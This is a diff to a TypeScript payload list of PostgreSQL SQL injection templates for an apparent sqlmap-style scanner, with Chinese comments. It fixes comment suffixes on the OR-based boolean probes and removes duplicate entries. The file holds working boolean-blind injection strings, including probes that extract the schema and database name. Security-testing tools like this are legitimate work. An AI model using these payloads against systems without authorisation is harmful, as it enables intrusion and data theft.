@@ -171,8 +171,10 @@ export const postgresPayloads = {
     "{ORIG} AND 1=1",
     "{ORIG} AND 1=2",
     // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
-    "{ORIG}' OR '1'='1",
-    "{ORIG}' OR '1'='2",
+    // [D214] 补注释后缀：裸 OR 会被 WHERE 里后续的 AND 条件续接 ⇒ 尾部引号未闭合 ⇒
+    // SQL 语法报错，真/假两侧落同一张错页 ⇒ 布尔判据静默失效（与 D209 同源，那边是 MySQL/Derby）。
+    "{ORIG}' OR '1'='1'-- -",
+    "{ORIG}' OR '1'='2'-- -",
     // —— 扩容：注释符 /**/ 变体 + UPDATE 逗号拼接 + ORDER BY 除零（对标 sqlmap PG 向量）——
     "{ORIG}' AND '1'='1/**/",
     "{ORIG}' AND '1'='2/**/",
@@ -212,8 +214,8 @@ export const postgresPayloads = {
     "{ORIG} OR 1=1-- -",
     "{ORIG} OR 1=2-- -",
     "{ORIG} OR 1=1/**/",
-    "{ORIG}' OR '1'='1'-- -",
-    "{ORIG}' OR '1'='2'-- -",
+    // [D214] 此处原有 `{ORIG}' OR '1'='1'-- -` / `'1'='2` 与固定索引 [6]/[7] 逐字节重复
+    // （[6]/[7] 已按 D214 补注释后缀）——删重复、保留固定索引位，避免同一模板被投放两次。
     "{ORIG} AND (SELECT SUBSTR(current_schema,1,1))='p'-- -",
     "{ORIG} AND (SELECT SUBSTR(current_schema,1,1))='x'-- -",
     "{ORIG} AND (SELECT SUBSTR(current_database(),1,1)) LIKE 'p'-- -",
